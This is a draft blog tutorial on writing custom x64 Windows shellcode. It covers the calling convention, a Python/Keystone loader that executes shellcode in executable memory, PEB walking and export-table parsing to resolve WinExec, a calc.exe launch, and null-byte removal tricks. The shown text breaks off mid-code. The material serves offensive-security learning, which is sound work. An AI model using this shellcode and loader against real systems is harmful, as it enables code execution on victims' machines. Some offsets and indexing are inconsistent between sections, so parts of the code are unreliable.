---
layout: single
title:  "Custom Shellcode Creation in x64 draft"
date:   2024-05-02 06:48:14 +0100
tags: [posts]
excerpt: "Investigating custom shellcode creation on x64 Windows architectures, also understanding the calling convention in order to obtain a reverse shell"
published: false
---
Introduction
---
This post will discuss creating custom shellcode on x64 architectures. Additionally, the topic of [calling conventions](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170){:target="_blank"} will be explored through a simple C program and visualized with WinDBG.

Calling Conventions
---
### Calling convention defaults
The x64 Application Binary Interface (ABI) employs a fast-call calling convention by default, which uses four registers to pass the initial arguments of a function:

* **Registers Used**: The first four integer arguments of a function are passed using the registers `RCX`, `RDX`, `R8`, and `R9`. For floating-point arguments, `XMM0L`, `XMM1L`, `XMM2L`, and `XMM3L` are used.
* **Shadow Store**: A space is allocated on the call stack, known as shadow store, which allows calls to save these records if needed. A more detailed explanation is given later, in "[What is shadow space](#what-is-shadow-space)".

**Argument Size and Passing Mechanism**

* **Size Constraints**: Any argument that does not fit within 8 bytes, or that isn't of size 1, 2, 4, or 8 bytes, must be passed by reference, which means passing a pointer to the data rather than the data itself.
* **Single Register Rule**: A single argument is never split across multiple registers; it is either fitted into one register or passed by reference if too large.

**Register Volatility and Floating Point Operations**

* **Volatility**: The ABI designates certain registers as volatile, meaning they can be altered across function calls. For integers, `RCX`, `RDX`, `R8`, `R9`, `RAX`, `R10`, and `R11` are volatile. For floating-point operations, `XMM0` to `XMM5` are considered volatile.
* **Floating Point Handling**: The [x87 floating-point stack](https://en.wikipedia.org/wiki/X87){:target="_blank"} is generally unused, with all floating-point operations conducted using the 16 XMM registers to maintain precision and performance.

**Special Considerations for Function Calls**

* **Space Allocation for Parameters**: The caller must allocate space sufficient to store four register parameters on the stack, regardless of how many parameters the callee actually uses. This simplifies handling for various types of functions, including those without prototypes.
* **Varargs and Unprototyped Functions**: For functions with variable arguments or without prototypes, floating-point values must also be duplicated in corresponding general-purpose registers to ensure they are passed correctly.
* **Parameter Conversion**: For prototyped functions, all arguments are converted to the callee's expected types before being passed, ensuring type safety and consistency.

### Alignment
In x64 architecture, most structures adhere to their natural alignment, typically aligned to boundaries that match their sizes (e.g., an `int` might be aligned to 4 bytes). The notable exceptions are:

* **Stack Pointer and Dynamically Allocated Memory**: The stack pointer (`rsp`) and memory allocated via `malloc` or `alloca` are aligned to 16 bytes. This alignment enhances performance, particularly for SIMD operations that require 16-byte alignment.
* **Manual Alignment for Larger Sizes**: Alignments greater than 16 bytes are not automatically ensured and must be manually implemented by the developer. This is particularly relevant when dealing with data structures intended for operations that benefit from or require higher alignments, such as certain SIMD instructions.

### Unwindability
Unwindability refers to the ability to reverse the effects of a function call, crucial for exception handling:

* **Leaf Functions:** These functions do not modify any non-volatile registers or the stack pointer (`rsp`), and thus, are inherently unwindable without additional metadata.
* **Non-Leaf Functions**: These may alter rsp either by calling other functions or allocating space for local variables. To facilitate proper unwinding during exception handling, non-leaf functions must be annotated with static data known as procedure data (`pdata`) which in turn references exception handling data (`xdata`).
* **Prologs and Epilogs**: These parts of functions, which set up and tear down the stack frame, respectively, must adhere to strict rules to maintain 16-byte alignment of the stack and be accurately described by `xdata`. Detailed guidance on the structure of prologs and epilogs can enhance understanding of their critical role in maintaining function integrity across calls.

### Parameter passing
The x64 calling convention optimizes function calls by utilizing registers for the first few arguments and the stack for additional arguments:

* **Registers**: The first four integer arguments are passed in registers `RCX`, `RDX`, `R8`, and `R9`, from left to right. Floating-point arguments within the first four positions are passed in `XMM0` through `XMM3`.
* **Stack**: Arguments beyond the first four are passed on the stack, and all stack-passed arguments are pushed in right-to-left order. This maintains a consistent calling convention across different function calls.
* **Special Handling**: Structures and unions, depending on their size, may be passed directly as integers or via pointers to memory allocated by the caller, which must also be 16-byte aligned. This ensures efficient access and manipulation of data passed to functions.

The following table summarizes how parameters are passed, by type and position from the left:

| Parameter type | fifth and higher | fourth | third | second | leftmost |
|-|-|-|-|-|-|
| floating-point | stack | XMM3 | XMM2 | XMM1 | XMM0 |
| integer | stack | R9 | R8 | RDX | RCX |
| Aggregates (8, 16, 32, or 64 bits) and **`__m64`** | stack | R9 | R8 | RDX | RCX |
| Other aggregates, as pointers | stack | R9 | R8 | RDX | RCX |
| **`__m128`**, as a pointer | stack | R9 | R8 | RDX | RCX |

### Demo

The following C code is created:

```c
#include <stdio.h>

void testFunction(int a, int b, int c, int d, int e, int f, int g) {
    printf("Arguments received in the function: a=%d, b=%d, c=%d, d=%d, e=%d, f=%d, g=%d\n", a, b, c, d, e, f, g);
}

int main() {
    testFunction(1, 2, 3, 4, 5, 6, 7);
    return 0;
}
```

The binary is compiled using `MinGW32`, and the `-g` flag is set to ensure that the executable contains debug information. This information is necessary for setting a breakpoint in the function of interest within WinDBG.
```
root@debian:~# x86_64-w64-mingw32-g++ -g calling_conventions.c -o calling_conventions.exe
root@debian:~# ls
calling_conventions.c  calling_conventions.exe
```
First, a breakpoint is set in the function `testFunction`, which contains the parameters passed to it. Once the breakpoint is created, the program can be resumed. When the breakpoint is reached, the registers are displayed, showing the values 1, 2, 3, and 4 in the corresponding registers (`RCX`, `RDX`, `R8`, and `R9`) respectively.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_18-32.png" alt="">

To display additional values, the stack must be examined. However, it is crucial to consider the stack frame layout and the shadow space that is reserved.

### What is Shadow Space?
Shadow space is an area reserved on the stack immediately preceding the call to a function. In the x64 calling convention, 32 bytes (enough to store four 8-byte registers) are set aside. This space is primarily intended for the called function to optionally save the register values used for passing the first four parameters. Although the called function may not always use this space, it is always allocated by the caller, which influences where on the stack any fifth and subsequent arguments are positioned.

To accurately inspect additional arguments beyond the first four, you must account for this shadow space. Typically, to locate these subsequent arguments, one would start inspecting the stack at `RSP + 32 bytes`. However, in some cases, such as in the presence of function prologues that manipulate the stack further, additional space must be considered.

In this scenario, an additional 8 bytes (bringing the total to 40 bytes, or `28h` in hexadecimal) were added beyond the shadow space to bypass unexpected entries. These entries might include return addresses or runtime setup instructions like those for `atexit`, which are not part of the function's formal parameters but are part of the call stack's state at the function entry point.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_18-39.png" alt="">

After this brief overview of how calling conventions work on Windows, we proceed to the main objective of this post: to create custom shellcode for x64 architectures.

x64 Shellcode Development
---

First of all, a test environment must be created. This requires:

- A virtual machine with Windows 10 installed
- [Python 3.11 in the x64 version](https://www.python.org/downloads/release/python-3110/){:target="_blank"}
- Python module keystone-engine (installable via `pip install keystone-engine`)
- WinDBG (installable via Microsoft Store)
- [Visual Studio Code](https://code.visualstudio.com/){:target="_blank"}

Subsequently, a Python 3 code skeleton is created to compile a set of assembly instructions into executable shellcode using the Keystone assembler. The script allocates memory, executes the shellcode in a new thread, and attaches a debugger (WinDBG) to the process for real-time debugging.

```python
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        "   int3;"                       # Breakpoint
        "   nop;"
        "   nop;"
        "   nop;"
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```

The first step is to obtain the base address of Kernel32. This involves examining the PEB (Process Environment Block) of the process to identify the base address of the mapped libraries.

Below is a detailed view of the Thread Environment Block (TEB) in WinDBG, showing the location of the Process Environment Block (PEB) pointer at offset `0x60`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-26.png" alt="">

In the second screenshot, we focus on the PEB structure, specifically at offset `0x18`, which points to the `PEB_LDR_DATA` structure. This structure plays a crucial role in tracking all the modules (DLLs and EXEs) loaded into the process's address space. The highlighted area reveals the starting address of the `PEB_LDR_DATA`, which is essential for navigating through the list of loaded modules.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-27.png" alt="">

The final screenshot illustrates the `PEB_LDR_DATA` structure, zooming into offset `0x20` where the `InMemoryOrderModuleList` is located. This doubly-linked list contains detailed entries for each module loaded in memory, ordered by their memory layout. Highlighted is the start of this list, which typically begins with the kernel32 module.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-04-30_19-27_1.png" alt="">

A modification is made to the Python code to include these offsets and store the Kernel32 base address in the `RBX` and `R8` registers.

```py
" locate_kernel32:"
    "   xor rcx, rcx;"               # Zero out RCX to use it as an offset

    # Get the address of the PEB from the GS segment register.
    # The PEB is located at offset 0x60 from the start of the TEB.
    "   mov rax, gs:[rcx + 0x60];"   # +0x060 PEB

    # Move to the PEB.Ldr field, which is at offset 0x18 in the PEB structure.
    # PEB.Ldr points to the PEB_LDR_DATA structure.
    "   mov rax, gs:[rax + 0x18];"   # +0x018 PEB.Ldr

    # Move to the InMemoryOrderModuleList, which starts at offset 0x20 in the PEB_LDR_DATA.
    # This list contains all loaded modules in the order they are loaded in memory.
    "   mov rsi, gs:[rax + 0x20];"   # +0x020 PEB.Ldr.InMemoryOrderModuleList

    # Load the first entry from the InMemoryOrderModuleList into RAX.
    # The list entry points to the base of the first module.
    "   lodsq;"                      # Loads qword from RSI into RAX

    # Swap RAX and RSI to prepare for the next load operation.
    # This step ensures that RSI points to the next module in the memory order list.
    "   xchg rax, rsi;"              # Swap RAX & RSI

    # Load the second entry from the InMemoryOrderModuleList.
    # This step typically points to the kernel32.dll base since it's usually the first system module loaded.
    "   lodsq;"                      # Loads qword from RSI into RAX

    # Move the base address of kernel32.dll, which is located at offset 0x20 from the module list entry, into RBX.
    "   mov rbx, [rax + 0x20] ;"     # RBX = Kernel32 base address

    # Copy the base address of kernel32.dll to R8 for further use or display.
    "   mov r8, rbx; "               # Copy Kernel32 base address to R8 register
```

### Parsing Kernel32 Export Address Table (EAT)

With the base address of Kernel32 known, the next step is to determine the addresses of the functions to be called by parsing the DLL’s Export Address Table (EAT). The structure of the EAT is represented by the `IMAGE_EXPORT_DIRECTORY` structure as follows:

```cpp
public struct IMAGE_EXPORT_DIRECTORY
{
    public UInt32 Characteristics;
    public UInt32 TimeDateStamp;
    public UInt16 MajorVersion;
    public UInt16 MinorVersion;
    public UInt32 Name;
    public UInt32 Base;
    public UInt32 NumberOfFunctions;
    public UInt32 NumberOfNames;
    public UInt32 AddressOfFunctions;
    public UInt32 AddressOfNames;
    public UInt32 AddressOfNameOrdinals;
}
```

Key fields in this structure are particularly important for understanding how the PE loader performs function lookups:

* **Name:** The name of the DLL.
* **Base:** The number used to adjust the ordinal number to index into the `AddressOfFunctions` array.
* **NumberOfFunctions**: The total number of functions exported, either by name or ordinal.
* **NumberOfNames**: The number of exported names, which might differ from `NumberOfFunctions`. This field only counts functions exported by name. If zero, all functions are exported by ordinal.
* **AddressOfFunctions**: A Relative Virtual Address (RVA) pointing to an array of `DWORD` values, each indicating the RVA to the respective function or a forwarding string for forwarded functions.
* **AddressOfNames**: An RVA pointing to an array of `DWORDs`, each an RVA to the name of an exported function.
* **AddressOfNameOrdinals**: An RVA pointing to an array of `WORDs` representing the export ordinals associated with the names. The values here should be adjusted by the starting ordinal number specified in the `Base` field.

To find the location of the Export Address Table, start by determining the offset to the PE (Portable Executable) signature, which is consistently located at offset 0x03C from the base address of the executable.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-02.png" alt="">

When examining the Export Address Table, it's essential to know the current base address of the module in question. This information can be used to navigate to the correct location in memory where the Export Address Table is mapped.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-03.png" alt="">

Using WinDBG, the contents of the Export Address Table can be viewed with the display type (`dt`) command, which shows the offsets and structure of the table. To ensure that all necessary debugging symbols are available and correctly loaded during this process, the command `.symopt+0x100` is used. This command enables the `SYMOPT_LOAD_LINES` option, which directs the debugger to load line number information associated with the symbols, enhancing the detail and utility of the debugging session.
Simultaneously, the first entry 'Name' is obtained to verify that the correct DLL is being examined.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_13-05.png" alt="">

Dumping the `AddressOfNames` Relative Virtual Address (RVA) provides the names of the functions exported by the DLL.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_17-06.png" alt="">


Proceeding to demonstrate how to follow these steps in WinDBG to obtain the `NumberOfFunctions` from the EAT.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_17-35.png" alt="">


In total, it is discovered that 1312 functions are exported from Kernel32.

Each command executed will be explained for proper understanding:

* `dd kernel32+0x3c L1`: Offset `0x3c` in the DOS header points to the location of the PE header.
* `dd kernel32+0xf0+0x88 L1`: Get base address of Export Address Table. This command calculates the location of the Export Address Table by adding the offsets:
    - `0xf8` (from DOS header to PE header) + `0x88` (offset to Export Table in Optional Header). It fetches the address at which the Export Table starts within the DLL.
* `dd kernel32+0xf0+0x88+0x14 L1`: It reads the memory `0x14` bytes offset from the start of the Export Address Table, which contains the count of exported functions.

The Python code would look like this:

```
"   mov ebx, [rbx+0x3C]; "          # Get offset to the PE header from the DOS header at offset 0x3C
"   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
"   mov edx, [rbx+0x88];"           # Get Relative Virtual Address (RVA) of Export Address Table from PE header
"   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
"   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
"   xor r11, r11;"                  # Zero out R11 to use it as a clean register
"   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
"   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
```

### Parse AddressOfNames to obtain WinExec

Next, we simply need to loop over the `AddressOfNames` list. We know the length of the list based on the `NumberOfFunctions` field. Once we have found the function we are looking for, we store its index in `RCX` and continue execution.

```
"   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
"kernel32findfunction: "
" jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
"   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
"   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
"   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
"   dec rcx;"                       # Decrement the loop counter
"   mov rax, 0x00636578456E6957;"   # Load the ASCII value of 'WinExec' into RAX for comparison          
"   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
"   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
 
"FunctionNameFound: "
"  nop;"
```

### Finding the WinExec Address

The position where we found the function name in the list will remain stored in the `RCX` register. Following this, we look up the function ordinal based on this index. An ordinal serves as the identifier for a function within a DLL. While we could have conducted a lookup based on this ordinal instead of the function name, it's worth noting that this value might change in future DLL releases.

```
"FunctionNameFound: "
# Entry point after finding the target function name 'WinExec'
"   xor r11, r11;"
"   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
# Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
"   inc rcx;"
"   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
# Preparing to fetch the actual function address from AddressOfFunctions
"   xor r11, r11;"
"   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
"   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
"   mov eax, [r11+r13*4];"          # Fetch the function address RVA using the ordinal as an index
"   add rax, r8;"                   # Convert function address RVA to absolute address
"   mov r14, rax;"                  # Store the resolved function address in R14 for later use
```

### Call WinExec

Once the address of the function is stored in the `R14` register, WinExec can be called. This function requires the following input parameters, taken from the [Microsoft documentation](https://learn.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-winexec){:target="_blank"}.

```cpp
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
);
```
Where:

* `lpCmdLine` will contain the command we want to execute.
* Following the [documentation](https://learn.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-showwindow){:target="_blank"}, `uCmdShow` will be set to 1, as we want to have a visible window.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_18-14.png" alt="">

Since the function only accepts two input parameters, as seen in the [calling conventions](#calling-conventions) section, we will only need to utilize the `RCX` and `RDX` registers.

```
# WinExec Call
"  xor rax, rax;"                   # Zero RAX to create a null byte
"  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
"  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
"  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
"  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
"  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
"  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
"  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
"  call r14;"                       # Call WinExec using the address stored in R14
```

Our code so far:

```python
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        "   int3;"                          # Breakpoint
        "  sub rsp, 0x208;"                 # Free up space in the stack
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Null RCX content
        "   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
        "   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
        "   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   xchg rax, rsi;"                 # Swap RAX & RSI
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
        "   mov ebx, [rbx+0x3C]; "          # Get offset to the PE header from the DOS header at offset 0x3C
        "   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
        "   mov edx, [rbx+0x88];"           # Get Relative Virtual Address (RVA) of Export Address Table from PE header
        "   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
        "   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
        "   xor r11, r11;"                  # Zero out R11 to use it as a clean register
        "   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
        "   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
        "   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
        "   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
        "   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
        "   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
        "   dec rcx;"                       # Decrement the loop counter
        "   mov rax, 0x00636578456E6957;"   # Load the ASCII value of 'WinExec' into RAX for comparison          
        "   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
        "   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
        "FunctionNameFound: "
        # Entry point after finding the target function name 'WinExec'
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
        # Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
        # Preparing to fetch the actual function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
        "   mov eax, [r11+4+r13*4];"          # Fetch the function address RVA using the ordinal as an index
        "   add rax, r8;"                   # Convert function address RVA to absolute address
        "   mov r14, rax;"                  # Store the resolved function address in R14 for later use
        # WinExec Call
        "  xor rax, rax;"                   # Zero RAX to create a null byte
        "  push rax;"                       # Push the null byte onto the stack, acts as string terminator for "calc.exe"
        "  mov rax, 0x6578652E636C6163;"    # Move the reverse byte-order string 'calc.exe' into RAX
        "  push rax;"                       # Push the string 'calc.exe' onto the stack (Note: string must be reversed in memory)
        "  mov rcx, rsp;"                   # Set RCX to point to the string "calc.exe" on the stack, RCX is the first argument for WinExec
        "  xor rdx, rdx;"                   # Zero out RDX, preparing it for the next operation
        "  inc rdx;"                        # Set RDX to 1; this sets uCmdShow parameter for WinExec to SW_SHOWNORMAL
        "  sub rsp, 0x20;"                  # Allocate 32 bytes of shadow space on the stack to prevent overwriting during the call
        "  call r14;"                       # Call WinExec using the address stored in R14
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```

When executing the script, an access violation is observed due to the presence of null bytes (`0x00`) within our shellcode.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_18-20.png" alt="">

### Removing Null Bytes

To solve this problem, alternative instructions that lead to the same result must be used. For example, rather than subtracting, adding a negative number to a register achieves the same effect.

The first identified instruction containing nullbytes is `sub rsp, 0x208`.

```
0:003> ? 0x208
Evaluate expression: 520 = 00000000`00000208
```

The same technique as mentioned above is used. First, it is verified that `-0x208` does not contain a nullbyte.

```
0:003> ? -0x208
Evaluate expression: -520 = ffffffff`fffffdf8
```
Therefore the instruction is modified to `add rsp, 0xfffffffffffffdf8`.

The next problem encountered is the instruction `mov edx, [rbx+0x88];"`.

```
0:003> ? 0x88
Evaluate expression: 136 = 00000000`00000088
```

In this case, our approach involves selecting a larger initial value that, when bit-shifted, achieves the desired offset, thereby allowing us to trim off any unnecessary characters. Therefore, a left-shift of the initial value with 20 bits (`0x14`) will be performed.

```
0:003> ? 0x88 << 0x14
Evaluate expression: 142606336 = 00000000`08800000
```

Then, a bitwise OR with `0xFFFFF` is applied to fill the lower bits, modifying the byte pattern without affecting the shifted value:

```
0:003> ? (00000000`08800000|0xFFFFF)
Evaluate expression: 143654911 = 00000000`088fffff
```

Finally, the operation is confirmed by shifting the same 20 bits (`0x14`) to the right, ensuring that the significant bits return to the original value:

```
0:003> ? 0x00000000`088fffff >> 14
Evaluate expression: 136 = 00000000`00000088
```

This is incorporated into our code as follows:

```
xor r12, r12;              # Zero out r12 to start fresh
add r12, 0x88FFFFF;        # Load r12 with a large number
shr r12, 0x14;             # Right-shift r12 by 20 bits to get 0x88
mov edx, [rbx+r12];        # Move the value at rbx+0x88 into edx
```

The last problem we ran into is the following step when trying to move *WinExec* string to the `rax` registry.

<img src="{{ site.url }}{{ site.baseurl }}/images/2024-05-01_19-40.png" alt="">

The same procedure as mentioned above is followed:

```
0:003> ? 0x00636578456E6957 << 8
Evaluate expression: 7162263022003115776 = 63657845`6e695700
0:003> ? (63657845`6e695700|0xFF)
Evaluate expression: 7162263022003116031 = 63657845`6e6957ff
0:003> ? 63657845`6e6957ff >> 8
Evaluate expression: 27977589929699671 = 00636578`456e6957
```

The code to add to the script is the following:

```
"   mov rax, 0x636578456E6957FF;"   # Load the calculated initial value
"   shr rax, 0x8;"                  # Shift right by 8 bits to get the desired WinExec string
```

### Final Code

```
import ctypes, struct
import os
import subprocess
from keystone import *
 
def main():
    SHELLCODE = (
        " start: "
        # "   int3;"                        # Breakpoint
        # "  sub rsp, 0x208;"               # Free up space in the stack (Null Byte)
        "   add rsp, 0xfffffffffffffdf8;"   # Free up space in the stack (Fix)
        " locate_kernel32:"
        "   xor rcx, rcx;"                  # Null RCX content
        "   mov rax, gs:[rcx + 0x60];"      # +0x060 PEB
        "   mov rax, [rax + 0x18];"         # +0x018 PEB.Ldr
        "   mov rsi, [rax + 0x20];"         # +0x020 PEB.Ldr.InMemoryOrderModuleList
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   xchg rax, rsi;"                 # Swap RAX & RSI
        "   lodsq;"                         # Loads qword from RSI into RAX
        "   mov rbx, [rax + 0x20];"         # RBX = Kernel32 base address
        "   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register
        "   mov ebx, [rbx+0x3C];"           # Get offset to the PE header from the DOS header at offset 0x3C
        "   add rbx, r8; "                  # Calculate absolute address of PE header by adding base address of kernel32.dll
        # "   mov edx, [rbx+0x88];"         # Get Relative Virtual Address (RVA) of Export Address Table from PE header (Null Byte)
        # Fix below
        "   xor r12, r12;"                  # Zero out r12 to start fresh
        "   add r12, 0x88FFFFF;"            # Load r12 with a large number
        "   shr r12, 0x14;"                 # Right-shift r12 by 20 bits to get 0x88
        "   mov edx, [rbx+r12];"            # Move the value at rbx+0x88 into edx
        "   add rdx, r8;"                   # Convert RVA of Export Address Table to absolute address by adding base address
        "   mov r10d, [rdx+0x14];"          # Load number of exported functions from Export Address Table
        "   xor r11, r11;"                  # Zero out R11 to use it as a clean register
        "   mov r11d, [rdx+0x20];"          # Get RVA of the AddressOfNames from the Export Address Table
        "   add r11, r8;"                   # Convert AddressOfNames RVA to absolute address by adding base address
        "   mov rcx, r10;"                  # Initialize RCX with the number of functions (loop counter)
        "kernel32findfunction: "
        " jecxz FunctionNameFound;"         # Jump to FunctionNameFound if RCX is zero (no more functions to check)
        "   xor ebx,ebx;"                   # Clear EBX to use as a temporary register
        "   mov ebx, [r11+4+rcx*4];"        # Load RVA of current function name into EBX (adjust index as rcx decrements)
        "   add rbx, r8;"                   # Convert RVA to absolute address (function name VMA)
        "   dec rcx;"                       # Decrement the loop counter
        #"   mov rax, 0x00636578456E6957;"  # Load the ASCII value of 'WinExec' into RAX for comparison          
        # Fix below
        "   mov rax, 0x636578456E6957FF;"   # Load the calculated initial value
        "   shr rax, 0x8;"                  # Shift right by 8 bits to get the desired WinExec string
        "   cmp [rbx], rax;"                # Compare the first eight bytes of the function name at RBX with 'WinExec'
        "   jnz kernel32findfunction;"      # If not matched, jump back to start of loop
        "FunctionNameFound: "
        # Entry point after finding the target function name 'WinExec'
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x24];"          # Load the RVA of the AddressOfNameOrdinals from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA (Virtual Memory Address)
        # Incrementing the counter to match the ordinal array index, since we decremented it in the search loop
        "   inc rcx;"
        "   mov r13w, [r11+rcx*2];"         # Retrieve the function ordinal using the adjusted counter from AddressOfNameOrdinals
        # Preparing to fetch the actual function address from AddressOfFunctions
        "   xor r11, r11;"
        "   mov r11d, [rdx+0x1c];"          # Load the RVA of the AddressOfFunctions from the Export Table
        "   add r11, r8;"                   # Convert RVA to absolute VMA where the function addresses are stored
        "   mov eax, [r11+4+r13*4];"        # Fetch the function address RVA using the ordinal as an index
